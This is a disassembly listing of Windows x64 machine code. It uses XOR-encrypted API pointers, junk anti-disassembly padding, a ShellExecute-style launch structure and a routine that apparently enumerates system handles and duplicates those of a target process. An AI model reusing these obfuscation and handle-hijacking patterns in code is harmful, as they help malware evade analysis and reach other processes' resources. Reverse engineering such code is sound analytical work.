  402664:	01 c8                	add    %ecx,%eax
  402666:	88 45 10             	mov    %al,0x10(%rbp)
  402669:	0f b6 45 10          	movzbl 0x10(%rbp),%eax
  40266d:	c1 f8 05             	sar    $0x5,%eax
  402670:	0f b6 4d 10          	movzbl 0x10(%rbp),%ecx
  402674:	c1 e1 02             	shl    $0x2,%ecx
  402677:	09 c8                	or     %ecx,%eax
  402679:	0f b6 4d 10          	movzbl 0x10(%rbp),%ecx
  40267d:	31 c1                	xor    %eax,%ecx
  40267f:	88 4d 10             	mov    %cl,0x10(%rbp)
  402682:	0f b6 45 10          	movzbl 0x10(%rbp),%eax
  402686:	81 c0 83 00 00 00    	add    $0x83,%eax
  40268c:	88 45 10             	mov    %al,0x10(%rbp)
  40268f:	0f b6 45 10          	movzbl 0x10(%rbp),%eax
  402693:	c9                   	leave
  402694:	c3                   	ret
  402695:	cc                   	int3
  402696:	cc                   	int3
  402697:	e8 00 00 00 00       	call   0x40269c
  40269c:	48 83 c4 08          	add    $0x8,%rsp
  4026a0:	c3                   	ret
  4026a1:	90                   	nop
  4026a2:	90                   	nop
  4026a3:	cc                   	int3
  4026a4:	90                   	nop
  4026a5:	eb 0b                	jmp    0x4026b2
  4026a7:	48 31 c0             	xor    %rax,%rax
  4026aa:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
  4026b1:	90                   	nop
  4026b2:	55                   	push   %rbp
  4026b3:	48 89 e5             	mov    %rsp,%rbp
  4026b6:	48 81 ec 50 00 00 00 	sub    $0x50,%rsp
  4026bd:	48 89 4d 10          	mov    %rcx,0x10(%rbp)
  4026c1:	b8 00 00 00 00       	mov    $0x0,%eax
  4026c6:	89 45 fc             	mov    %eax,-0x4(%rbp)
  4026c9:	48 8b 45 10          	mov    0x10(%rbp),%rax
  4026cd:	48 83 c0 10          	add    $0x10,%rax
  4026d1:	8b 00                	mov    (%rax),%eax
  4026d3:	49 89 c2             	mov    %rax,%r10
  4026d6:	4c 89 d1             	mov    %r10,%rcx
  4026d9:	4c 8b 1d 20 84 00 00 	mov    0x8420(%rip),%r11        # 0x40ab00
  4026e0:	48 8b 05 41 84 00 00 	mov    0x8441(%rip),%rax        # 0x40ab28
  4026e7:	4c 33 18             	xor    (%rax),%r11
  4026ea:	41 ff d3             	call   *%r11
  4026ed:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
  4026f1:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
  4026f5:	48 83 f8 00          	cmp    $0x0,%rax
  4026f9:	0f 85 05 00 00 00    	jne    0x402704
  4026ff:	e9 cc 00 00 00       	jmp    0x4027d0
  402704:	48 8b 45 10          	mov    0x10(%rbp),%rax
  402708:	48 83 c0 10          	add    $0x10,%rax
  40270c:	48 8b 4d 10          	mov    0x10(%rbp),%rcx
  402710:	48 83 c1 20          	add    $0x20,%rcx
  402714:	48 8b 55 10          	mov    0x10(%rbp),%rdx
  402718:	48 83 c2 10          	add    $0x10,%rdx
  40271c:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
  402720:	48 8d 45 fc          	lea    -0x4(%rbp),%rax
  402724:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
  402729:	8b 12                	mov    (%rdx),%edx
  40272b:	49 89 d1             	mov    %rdx,%r9
  40272e:	48 8b 09             	mov    (%rcx),%rcx
  402731:	49 89 c8             	mov    %rcx,%r8
  402734:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
  402738:	8b 00                	mov    (%rax),%eax
  40273a:	49 89 c3             	mov    %rax,%r11
  40273d:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
  402741:	49 89 c2             	mov    %rax,%r10
  402744:	4c 89 d1             	mov    %r10,%rcx
  402747:	4c 89 da             	mov    %r11,%rdx
  40274a:	4c 8b 1d e7 83 00 00 	mov    0x83e7(%rip),%r11        # 0x40ab38
  402751:	48 8b 05 08 84 00 00 	mov    0x8408(%rip),%rax        # 0x40ab60
  402758:	4c 33 18             	xor    (%rax),%r11
  40275b:	41 ff d3             	call   *%r11
  40275e:	48 8b 45 10          	mov    0x10(%rbp),%rax
  402762:	48 83 c0 20          	add    $0x20,%rax
  402766:	49 89 c2             	mov    %rax,%r10
  402769:	4c 89 d1             	mov    %r10,%rcx
  40276c:	4c 8b 1d fd 83 00 00 	mov    0x83fd(%rip),%r11        # 0x40ab70
  402773:	48 8b 05 1e 84 00 00 	mov    0x841e(%rip),%rax        # 0x40ab98
  40277a:	4c 33 18             	xor    (%rax),%r11
  40277d:	41 ff d3             	call   *%r11
  402780:	48 8b 45 10          	mov    0x10(%rbp),%rax
  402784:	48 83 c0 20          	add    $0x20,%rax
  402788:	8b 4d fc             	mov    -0x4(%rbp),%ecx
  40278b:	49 89 c8             	mov    %rcx,%r8
  40278e:	48 8b 4d f0          	mov    -0x10(%rbp),%rcx
  402792:	49 89 cb             	mov    %rcx,%r11
  402795:	49 89 c2             	mov    %rax,%r10
  402798:	4c 89 d1             	mov    %r10,%rcx
  40279b:	4c 89 da             	mov    %r11,%rdx
  40279e:	4c 8b 1d 03 84 00 00 	mov    0x8403(%rip),%r11        # 0x40aba8
  4027a5:	48 8b 05 24 84 00 00 	mov    0x8424(%rip),%rax        # 0x40abd0
  4027ac:	4c 33 18             	xor    (%rax),%r11
  4027af:	41 ff d3             	call   *%r11
  4027b2:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
  4027b6:	49 89 c2             	mov    %rax,%r10
  4027b9:	4c 89 d1             	mov    %r10,%rcx
  4027bc:	4c 8b 1d 1d 84 00 00 	mov    0x841d(%rip),%r11        # 0x40abe0
  4027c3:	48 8b 05 3e 84 00 00 	mov    0x843e(%rip),%rax        # 0x40ac08
  4027ca:	4c 33 18             	xor    (%rax),%r11
  4027cd:	41 ff d3             	call   *%r11
  4027d0:	c9                   	leave
  4027d1:	c3                   	ret
  4027d2:	cc                   	int3
  4027d3:	cc                   	int3
  4027d4:	e8 00 00 00 00       	call   0x4027d9
  4027d9:	48 83 c4 08          	add    $0x8,%rsp
  4027dd:	c3                   	ret
  4027de:	90                   	nop
  4027df:	90                   	nop
  4027e0:	cc                   	int3
  4027e1:	90                   	nop
  4027e2:	eb 0b                	jmp    0x4027ef
  4027e4:	48 31 c0             	xor    %rax,%rax
  4027e7:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
  4027ee:	90                   	nop
  4027ef:	55                   	push   %rbp
  4027f0:	48 89 e5             	mov    %rsp,%rbp
  4027f3:	48 81 ec 90 00 00 00 	sub    $0x90,%rsp
  4027fa:	48 89 4d 10          	mov    %rcx,0x10(%rbp)
  4027fe:	48 89 55 18          	mov    %rdx,0x18(%rbp)
  402802:	b8 70 00 00 00       	mov    $0x70,%eax
  402807:	49 89 c0             	mov    %rax,%r8
  40280a:	b8 00 00 00 00       	mov    $0x0,%eax
  40280f:	49 89 c3             	mov    %rax,%r11
  402812:	48 8d 45 90          	lea    -0x70(%rbp),%rax
  402816:	49 89 c2             	mov    %rax,%r10
  402819:	4c 89 d1             	mov    %r10,%rcx
  40281c:	4c 89 da             	mov    %r11,%rdx
  40281f:	4c 8b 1d aa 87 00 00 	mov    0x87aa(%rip),%r11        # 0x40afd0
  402826:	48 8b 05 cb 87 00 00 	mov    0x87cb(%rip),%rax        # 0x40aff8
  40282d:	4c 33 18             	xor    (%rax),%r11
  402830:	41 ff d3             	call   *%r11
  402833:	b8 70 00 00 00       	mov    $0x70,%eax
  402838:	89 45 90             	mov    %eax,-0x70(%rbp)
  40283b:	b8 40 00 00 00       	mov    $0x40,%eax
  402840:	89 45 94             	mov    %eax,-0x6c(%rbp)
  402843:	48 8d 05 e6 68 00 00 	lea    0x68e6(%rip),%rax        # 0x409130
  40284a:	48 89 45 a0          	mov    %rax,-0x60(%rbp)
  40284e:	48 8b 45 10          	mov    0x10(%rbp),%rax
  402852:	48 89 45 a8          	mov    %rax,-0x58(%rbp)
  402856:	48 8b 45 18          	mov    0x18(%rbp),%rax
  40285a:	48 89 45 b0          	mov    %rax,-0x50(%rbp)
  40285e:	b8 00 00 00 00       	mov    $0x0,%eax
  402863:	89 45 c0             	mov    %eax,-0x40(%rbp)
  402866:	48 8d 45 90          	lea    -0x70(%rbp),%rax
  40286a:	49 89 c2             	mov    %rax,%r10
  40286d:	4c 89 d1             	mov    %r10,%rcx
  402870:	4c 8b 1d 91 87 00 00 	mov    0x8791(%rip),%r11        # 0x40b008
  402877:	48 8b 05 b2 87 00 00 	mov    0x87b2(%rip),%rax        # 0x40b030
  40287e:	4c 33 18             	xor    (%rax),%r11
  402881:	41 ff d3             	call   *%r11
  402884:	c9                   	leave
  402885:	c3                   	ret
  402886:	cc                   	int3
  402887:	cc                   	int3
  402888:	e8 00 00 00 00       	call   0x40288d
  40288d:	48 83 c4 08          	add    $0x8,%rsp
  402891:	c3                   	ret
  402892:	90                   	nop
  402893:	90                   	nop
  402894:	cc                   	int3
  402895:	90                   	nop
  402896:	eb 0b                	jmp    0x4028a3
  402898:	48 31 c0             	xor    %rax,%rax
  40289b:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
  4028a2:	90                   	nop
  4028a3:	55                   	push   %rbp
  4028a4:	48 89 e5             	mov    %rsp,%rbp
  4028a7:	48 81 ec 20 00 00 00 	sub    $0x20,%rsp
  4028ae:	48 89 4d 10          	mov    %rcx,0x10(%rbp)
  4028b2:	48 8b 45 10          	mov    0x10(%rbp),%rax
  4028b6:	48 83 c0 20          	add    $0x20,%rax
  4028ba:	b9 80 0c 00 00       	mov    $0xc80,%ecx
  4028bf:	49 89 c8             	mov    %rcx,%r8
  4028c2:	48 8d 0d 97 57 00 00 	lea    0x5797(%rip),%rcx        # 0x408060
  4028c9:	49 89 cb             	mov    %rcx,%r11
  4028cc:	49 89 c2             	mov    %rax,%r10
  4028cf:	4c 89 d1             	mov    %r10,%rcx
  4028d2:	4c 89 da             	mov    %r11,%rdx
  4028d5:	4c 8b 1d 44 81 00 00 	mov    0x8144(%rip),%r11        # 0x40aa20
  4028dc:	48 8b 05 65 81 00 00 	mov    0x8165(%rip),%rax        # 0x40aa48
  4028e3:	4c 33 18             	xor    (%rax),%r11
  4028e6:	41 ff d3             	call   *%r11
  4028e9:	c9                   	leave
  4028ea:	c3                   	ret
  4028eb:	cc                   	int3
  4028ec:	cc                   	int3
  4028ed:	e8 00 00 00 00       	call   0x4028f2
  4028f2:	48 83 c4 08          	add    $0x8,%rsp
  4028f6:	c3                   	ret
  4028f7:	90                   	nop
  4028f8:	90                   	nop
  4028f9:	cc                   	int3
  4028fa:	90                   	nop
  4028fb:	eb 0b                	jmp    0x402908
  4028fd:	48 31 c0             	xor    %rax,%rax
  402900:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
  402907:	90                   	nop
  402908:	55                   	push   %rbp
  402909:	48 89 e5             	mov    %rsp,%rbp
  40290c:	48 81 ec 40 00 00 00 	sub    $0x40,%rsp
  402913:	48 89 4d 10          	mov    %rcx,0x10(%rbp)
  402917:	48 89 55 18          	mov    %rdx,0x18(%rbp)
  40291b:	4c 89 45 20          	mov    %r8,0x20(%rbp)
  40291f:	4c 89 4d 28          	mov    %r9,0x28(%rbp)
  402923:	8b 45 18             	mov    0x18(%rbp),%eax
  402926:	49 89 c0             	mov    %rax,%r8
  402929:	48 8b 45 10          	mov    0x10(%rbp),%rax
  40292d:	49 89 c3             	mov    %rax,%r11
  402930:	48 8d 45 e8          	lea    -0x18(%rbp),%rax
  402934:	49 89 c2             	mov    %rax,%r10
  402937:	4c 89 d1             	mov    %r10,%rcx
  40293a:	4c 89 da             	mov    %r11,%rdx
  40293d:	4c 8b 1d 6c 80 00 00 	mov    0x806c(%rip),%r11        # 0x40a9b0
  402944:	48 8b 05 8d 80 00 00 	mov    0x808d(%rip),%rax        # 0x40a9d8
  40294b:	4c 33 18             	xor    (%rax),%r11
  40294e:	41 ff d3             	call   *%r11
  402951:	8b 45 28             	mov    0x28(%rbp),%eax
  402954:	49 89 c0             	mov    %rax,%r8
  402957:	48 8b 45 20          	mov    0x20(%rbp),%rax
  40295b:	49 89 c3             	mov    %rax,%r11
  40295e:	48 8d 45 e8          	lea    -0x18(%rbp),%rax
  402962:	49 89 c2             	mov    %rax,%r10
  402965:	4c 89 d1             	mov    %r10,%rcx
  402968:	4c 89 da             	mov    %r11,%rdx
  40296b:	4c 8b 1d 76 80 00 00 	mov    0x8076(%rip),%r11        # 0x40a9e8
  402972:	48 8b 05 97 80 00 00 	mov    0x8097(%rip),%rax        # 0x40aa10
  402979:	4c 33 18             	xor    (%rax),%r11
  40297c:	41 ff d3             	call   *%r11
  40297f:	c9                   	leave
  402980:	c3                   	ret
  402981:	cc                   	int3
  402982:	cc                   	int3
  402983:	e8 00 00 00 00       	call   0x402988
  402988:	48 83 c4 08          	add    $0x8,%rsp
  40298c:	c3                   	ret
  40298d:	90                   	nop
  40298e:	90                   	nop
  40298f:	cc                   	int3
  402990:	90                   	nop
  402991:	eb 0b                	jmp    0x40299e
  402993:	48 31 c0             	xor    %rax,%rax
  402996:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
  40299d:	90                   	nop
  40299e:	55                   	push   %rbp
  40299f:	48 89 e5             	mov    %rsp,%rbp
  4029a2:	48 81 ec c0 00 00 00 	sub    $0xc0,%rsp
  4029a9:	48 89 4d 10          	mov    %rcx,0x10(%rbp)
  4029ad:	48 89 55 18          	mov    %rdx,0x18(%rbp)
  4029b1:	4c 8b 1d d0 89 00 00 	mov    0x89d0(%rip),%r11        # 0x40b388
  4029b8:	48 8b 05 f1 89 00 00 	mov    0x89f1(%rip),%rax        # 0x40b3b0
  4029bf:	4c 33 18             	xor    (%rax),%r11
  4029c2:	41 ff d3             	call   *%r11
  4029c5:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
  4029c9:	b8 00 00 01 00       	mov    $0x10000,%eax
  4029ce:	89 45 f4             	mov    %eax,-0xc(%rbp)
  4029d1:	8b 45 f4             	mov    -0xc(%rbp),%eax
  4029d4:	49 89 c0             	mov    %rax,%r8
  4029d7:	b8 08 00 00 00       	mov    $0x8,%eax
  4029dc:	49 89 c3             	mov    %rax,%r11
  4029df:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  4029e3:	49 89 c2             	mov    %rax,%r10
  4029e6:	4c 89 d1             	mov    %r10,%rcx
  4029e9:	4c 89 da             	mov    %r11,%rdx
  4029ec:	4c 8b 1d cd 89 00 00 	mov    0x89cd(%rip),%r11        # 0x40b3c0
  4029f3:	48 8b 05 ee 89 00 00 	mov    0x89ee(%rip),%rax        # 0x40b3e8
  4029fa:	4c 33 18             	xor    (%rax),%r11
  4029fd:	41 ff d3             	call   *%r11
  402a00:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
  402a04:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
  402a08:	48 83 f8 00          	cmp    $0x0,%rax
  402a0c:	0f 85 07 00 00 00    	jne    0x402a19
  402a12:	31 c0                	xor    %eax,%eax
  402a14:	e9 91 03 00 00       	jmp    0x402daa
  402a19:	b8 00 00 00 00       	mov    $0x0,%eax
  402a1e:	89 45 e4             	mov    %eax,-0x1c(%rbp)
  402a21:	48 8d 05 0e 68 00 00 	lea    0x680e(%rip),%rax        # 0x409236
  402a28:	49 89 c2             	mov    %rax,%r10
  402a2b:	4c 89 d1             	mov    %r10,%rcx
  402a2e:	4c 8b 1d c3 89 00 00 	mov    0x89c3(%rip),%r11        # 0x40b3f8
  402a35:	48 8b 05 e4 89 00 00 	mov    0x89e4(%rip),%rax        # 0x40b420
  402a3c:	4c 33 18             	xor    (%rax),%r11
  402a3f:	41 ff d3             	call   *%r11
  402a42:	48 89 45 d8          	mov    %rax,-0x28(%rbp)
  402a46:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
  402a4a:	48 83 f8 00          	cmp    $0x0,%rax
  402a4e:	0f 85 37 00 00 00    	jne    0x402a8b
  402a54:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
  402a58:	49 89 c0             	mov    %rax,%r8
  402a5b:	b8 00 00 00 00       	mov    $0x0,%eax
  402a60:	49 89 c3             	mov    %rax,%r11
  402a63:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  402a67:	49 89 c2             	mov    %rax,%r10
  402a6a:	4c 89 d1             	mov    %r10,%rcx
  402a6d:	4c 89 da             	mov    %r11,%rdx
  402a70:	4c 8b 1d b9 89 00 00 	mov    0x89b9(%rip),%r11        # 0x40b430
  402a77:	48 8b 05 da 89 00 00 	mov    0x89da(%rip),%rax        # 0x40b458
  402a7e:	4c 33 18             	xor    (%rax),%r11
  402a81:	41 ff d3             	call   *%r11
  402a84:	31 c0                	xor    %eax,%eax
  402a86:	e9 1f 03 00 00       	jmp    0x402daa
  402a8b:	48 8d 05 c8 67 00 00 	lea    0x67c8(%rip),%rax        # 0x40925a
  402a92:	49 89 c3             	mov    %rax,%r11
  402a95:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
  402a99:	49 89 c2             	mov    %rax,%r10
  402a9c:	4c 89 d1             	mov    %r10,%rcx
  402a9f:	4c 89 da             	mov    %r11,%rdx
  402aa2:	4c 8b 1d bf 89 00 00 	mov    0x89bf(%rip),%r11        # 0x40b468
  402aa9:	48 8b 05 e0 89 00 00 	mov    0x89e0(%rip),%rax        # 0x40b490
  402ab0:	4c 33 18             	xor    (%rax),%r11
  402ab3:	41 ff d3             	call   *%r11
  402ab6:	48 89 45 d0          	mov    %rax,-0x30(%rbp)
  402aba:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
  402abe:	48 83 f8 00          	cmp    $0x0,%rax
  402ac2:	0f 85 37 00 00 00    	jne    0x402aff
  402ac8:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
  402acc:	49 89 c0             	mov    %rax,%r8
  402acf:	b8 00 00 00 00       	mov    $0x0,%eax
  402ad4:	49 89 c3             	mov    %rax,%r11
  402ad7:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  402adb:	49 89 c2             	mov    %rax,%r10
  402ade:	4c 89 d1             	mov    %r10,%rcx
  402ae1:	4c 89 da             	mov    %r11,%rdx
  402ae4:	4c 8b 1d b5 89 00 00 	mov    0x89b5(%rip),%r11        # 0x40b4a0
  402aeb:	48 8b 05 d6 89 00 00 	mov    0x89d6(%rip),%rax        # 0x40b4c8
  402af2:	4c 33 18             	xor    (%rax),%r11
  402af5:	41 ff d3             	call   *%r11
  402af8:	31 c0                	xor    %eax,%eax
  402afa:	e9 ab 02 00 00       	jmp    0x402daa
  402aff:	8b 45 e4             	mov    -0x1c(%rbp),%eax
  402b02:	89 45 f4             	mov    %eax,-0xc(%rbp)
  402b05:	8b 45 f4             	mov    -0xc(%rbp),%eax
  402b08:	49 89 c1             	mov    %rax,%r9
  402b0b:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
  402b0f:	49 89 c0             	mov    %rax,%r8
  402b12:	b8 08 00 00 00       	mov    $0x8,%eax
  402b17:	49 89 c3             	mov    %rax,%r11
  402b1a:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  402b1e:	49 89 c2             	mov    %rax,%r10
  402b21:	4c 89 d1             	mov    %r10,%rcx
  402b24:	4c 89 da             	mov    %r11,%rdx
  402b27:	4c 8b 1d aa 89 00 00 	mov    0x89aa(%rip),%r11        # 0x40b4d8
  402b2e:	48 8b 05 cb 89 00 00 	mov    0x89cb(%rip),%rax        # 0x40b500
  402b35:	4c 33 18             	xor    (%rax),%r11
  402b38:	41 ff d3             	call   *%r11
  402b3b:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
  402b3f:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
  402b43:	48 83 f8 00          	cmp    $0x0,%rax
  402b47:	0f 85 07 00 00 00    	jne    0x402b54
  402b4d:	31 c0                	xor    %eax,%eax
  402b4f:	e9 56 02 00 00       	jmp    0x402daa
  402b54:	48 8d 45 e4          	lea    -0x1c(%rbp),%rax
  402b58:	49 89 c1             	mov    %rax,%r9
  402b5b:	8b 45 f4             	mov    -0xc(%rbp),%eax
  402b5e:	49 89 c0             	mov    %rax,%r8
  402b61:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
  402b65:	49 89 c3             	mov    %rax,%r11
  402b68:	b8 10 00 00 00       	mov    $0x10,%eax
  402b6d:	49 89 c2             	mov    %rax,%r10
  402b70:	4c 89 d1             	mov    %r10,%rcx
  402b73:	4c 89 da             	mov    %r11,%rdx
  402b76:	4c 8b 5d d0          	mov    -0x30(%rbp),%r11
  402b7a:	41 ff d3             	call   *%r11
  402b7d:	89 45 e0             	mov    %eax,-0x20(%rbp)
  402b80:	8b 45 e0             	mov    -0x20(%rbp),%eax
  402b83:	81 f8 04 00 00 c0    	cmp    $0xc0000004,%eax
  402b89:	0f 84 70 ff ff ff    	je     0x402aff
  402b8f:	31 c0                	xor    %eax,%eax
  402b91:	48 89 45 c8          	mov    %rax,-0x38(%rbp)
  402b95:	b8 00 00 00 00       	mov    $0x0,%eax
  402b9a:	89 45 c4             	mov    %eax,-0x3c(%rbp)
  402b9d:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
  402ba1:	8b 4d c4             	mov    -0x3c(%rbp),%ecx
  402ba4:	8b 00                	mov    (%rax),%eax
  402ba6:	39 c1                	cmp    %eax,%ecx
  402ba8:	0f 83 c8 01 00 00    	jae    0x402d76
  402bae:	e9 0d 00 00 00       	jmp    0x402bc0
  402bb3:	8b 45 c4             	mov    -0x3c(%rbp),%eax
  402bb6:	89 c1                	mov    %eax,%ecx
  402bb8:	83 c0 01             	add    $0x1,%eax
  402bbb:	89 45 c4             	mov    %eax,-0x3c(%rbp)
  402bbe:	eb dd                	jmp    0x402b9d
  402bc0:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
  402bc4:	48 83 c0 08          	add    $0x8,%rax
  402bc8:	8b 4d c4             	mov    -0x3c(%rbp),%ecx
  402bcb:	ba 18 00 00 00       	mov    $0x18,%edx
  402bd0:	48 0f af ca          	imul   %rdx,%rcx
  402bd4:	48 01 c8             	add    %rcx,%rax
  402bd7:	56                   	push   %rsi
  402bd8:	57                   	push   %rdi
  402bd9:	48 89 c6             	mov    %rax,%rsi
  402bdc:	48 8d 7d a8          	lea    -0x58(%rbp),%rdi
  402be0:	48 a5                	movsq  (%rsi),(%rdi)
  402be2:	48 a5                	movsq  (%rsi),(%rdi)
  402be4:	48 a5                	movsq  (%rsi),(%rdi)
  402be6:	5f                   	pop    %rdi
  402be7:	5e                   	pop    %rsi
  402be8:	48 8b 45 18          	mov    0x18(%rbp),%rax
  402bec:	49 89 c2             	mov    %rax,%r10
  402bef:	4c 89 d1             	mov    %r10,%rcx
  402bf2:	4c 8b 1d 17 89 00 00 	mov    0x8917(%rip),%r11        # 0x40b510
  402bf9:	48 8b 05 38 89 00 00 	mov    0x8938(%rip),%rax        # 0x40b538
  402c00:	4c 33 18             	xor    (%rax),%r11
  402c03:	41 ff d3             	call   *%r11
  402c06:	8b 4d a8             	mov    -0x58(%rbp),%ecx
  402c09:	39 c1                	cmp    %eax,%ecx
  402c0b:	0f 85 60 01 00 00    	jne    0x402d71
  402c11:	31 c0                	xor    %eax,%eax
  402c13:	48 89 45 a0          	mov    %rax,-0x60(%rbp)
  402c17:	0f b7 45 ae          	movzwl -0x52(%rbp),%eax
  402c1b:	48 89 45 98          	mov    %rax,-0x68(%rbp)
  402c1f:	4c 8b 1d 22 89 00 00 	mov    0x8922(%rip),%r11        # 0x40b548
  402c26:	48 8b 05 43 89 00 00 	mov    0x8943(%rip),%rax        # 0x40b570
  402c2d:	4c 33 18             	xor    (%rax),%r11
  402c30:	41 ff d3             	call   *%r11
  402c33:	b9 02 00 00 00       	mov    $0x2,%ecx
  402c38:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
  402c3d:	b9 00 00 00 00       	mov    $0x0,%ecx
  402c42:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
  402c47:	b9 00 00 00 00       	mov    $0x0,%ecx
  402c4c:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
  402c51:	48 8d 4d a0          	lea    -0x60(%rbp),%rcx
  402c55:	49 89 c9             	mov    %rcx,%r9
  402c58:	49 89 c0             	mov    %rax,%r8
  402c5b:	48 8b 45 98          	mov    -0x68(%rbp),%rax
  402c5f:	49 89 c3             	mov    %rax,%r11
  402c62:	48 8b 45 18          	mov    0x18(%rbp),%rax
  402c66:	49 89 c2             	mov    %rax,%r10
  402c69:	4c 89 d1             	mov    %r10,%rcx
  402c6c:	4c 89 da             	mov    %r11,%rdx
  402c6f:	4c 8b 1d 0a 89 00 00 	mov    0x890a(%rip),%r11        # 0x40b580
  402c76:	48 8b 05 2b 89 00 00 	mov    0x892b(%rip),%rax        # 0x40b5a8
  402c7d:	4c 33 18             	xor    (%rax),%r11
  402c80:	41 ff d3             	call   *%r11
  402c83:	83 f8 00             	cmp    $0x0,%eax
  402c86:	0f 84 e5 00 00 00    	je     0x402d71
  402c8c:	b8 02 00 00 00       	mov    $0x2,%eax
  402c91:	49 89 c3             	mov    %rax,%r11
  402c94:	48 8b 45 a0          	mov    -0x60(%rbp),%rax
  402c98:	49 89 c2             	mov    %rax,%r10
  402c9b:	4c 89 d1             	mov    %r10,%rcx
  402c9e:	4c 89 da             	mov    %r11,%rdx
  402ca1:	4c 8b 1d 10 89 00 00 	mov    0x8910(%rip),%r11        # 0x40b5b8
  402ca8:	48 8b 05 31 89 00 00 	mov    0x8931(%rip),%rax        # 0x40b5e0
  402caf:	4c 33 18             	xor    (%rax),%r11
  402cb2:	41 ff d3             	call   *%r11
  402cb5:	48 89 45 90          	mov    %rax,-0x70(%rbp)
  402cb9:	48 8b 45 90          	mov    -0x70(%rbp),%rax
  402cbd:	48 83 f8 00          	cmp    $0x0,%rax
  402cc1:	0f 84 8c 00 00 00    	je     0x402d53
  402cc7:	48 8b 45 90          	mov    -0x70(%rbp),%rax
  402ccb:	48 89 45 88          	mov    %rax,-0x78(%rbp)
  402ccf:	48 8b 45 88          	mov    -0x78(%rbp),%rax
  402cd3:	48 83 c0 08          	add    $0x8,%rax
  402cd7:	48 8b 00             	mov    (%rax),%rax
  402cda:	49 89 c3             	mov    %rax,%r11
  402cdd:	48 8d 05 c8 65 00 00 	lea    0x65c8(%rip),%rax        # 0x4092ac
  402ce4:	49 89 c2             	mov    %rax,%r10
  402ce7:	4c 89 d1             	mov    %r10,%rcx
  402cea:	4c 89 da             	mov    %r11,%rdx
  402ced:	4c 8b 1d fc 88 00 00 	mov    0x88fc(%rip),%r11        # 0x40b5f0
  402cf4:	48 8b 05 1d 89 00 00 	mov    0x891d(%rip),%rax        # 0x40b618
  402cfb:	4c 33 18             	xor    (%rax),%r11
  402cfe:	41 ff d3             	call   *%r11
  402d01:	83 f8 00             	cmp    $0x0,%eax
  402d04:	0f 85 2b 00 00 00    	jne    0x402d35
  402d0a:	48 8b 45 a0          	mov    -0x60(%rbp),%rax
  402d0e:	48 89 45 c8          	mov    %rax,-0x38(%rbp)
  402d12:	48 8b 45 90          	mov    -0x70(%rbp),%rax
  402d16:	49 89 c2             	mov    %rax,%r10
  402d19:	4c 89 d1             	mov    %r10,%rcx
  402d1c:	4c 8b 1d 05 89 00 00 	mov    0x8905(%rip),%r11        # 0x40b628
  402d23:	48 8b 05 26 89 00 00 	mov    0x8926(%rip),%rax        # 0x40b650
  402d2a:	4c 33 18             	xor    (%rax),%r11
  402d2d:	41 ff d3             	call   *%r11
  402d30:	e9 41 00 00 00       	jmp    0x402d76
  402d35:	48 8b 45 90          	mov    -0x70(%rbp),%rax
  402d39:	49 89 c2             	mov    %rax,%r10
  402d3c:	4c 89 d1             	mov    %r10,%rcx
  402d3f:	4c 8b 1d 1a 89 00 00 	mov    0x891a(%rip),%r11        # 0x40b660
  402d46:	48 8b 05 3b 89 00 00 	mov    0x893b(%rip),%rax        # 0x40b688
  402d4d:	4c 33 18             	xor    (%rax),%r11
  402d50:	41 ff d3             	call   *%r11
  402d53:	48 8b 45 a0          	mov    -0x60(%rbp),%rax
  402d57:	49 89 c2             	mov    %rax,%r10
  402d5a:	4c 89 d1             	mov    %r10,%rcx
  402d5d:	4c 8b 1d 34 89 00 00 	mov    0x8934(%rip),%r11        # 0x40b698
  402d64:	48 8b 05 55 89 00 00 	mov    0x8955(%rip),%rax        # 0x40b6c0
  402d6b:	4c 33 18             	xor    (%rax),%r11
  402d6e:	41 ff d3             	call   *%r11
  402d71:	e9 3d fe ff ff       	jmp    0x402bb3
  402d76:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
  402d7a:	49 89 c0             	mov    %rax,%r8
  402d7d:	b8 00 00 00 00       	mov    $0x0,%eax
  402d82:	49 89 c3             	mov    %rax,%r11
  402d85:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  402d89:	49 89 c2             	mov    %rax,%r10
  402d8c:	4c 89 d1             	mov    %r10,%rcx
  402d8f:	4c 89 da             	mov    %r11,%rdx
  402d92:	4c 8b 1d 37 89 00 00 	mov    0x8937(%rip),%r11        # 0x40b6d0
  402d99:	48 8b 05 58 89 00 00 	mov    0x8958(%rip),%rax        # 0x40b6f8
  402da0:	4c 33 18             	xor    (%rax),%r11
  402da3:	41 ff d3             	call   *%r11
  402da6:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
  402daa:	c9                   	leave
  402dab:	c3                   	ret
  402dac:	cc                   	int3
  402dad:	cc                   	int3
  402dae:	e8 00 00 00 00       	call   0x402db3
  402db3:	48 83 c4 08          	add    $0x8,%rsp
  402db7:	c3                   	ret
  402db8:	90                   	nop
  402db9:	90                   	nop
  402dba:	cc                   	int3
  402dbb:	90                   	nop
  402dbc:	eb 0b                	jmp    0x402dc9
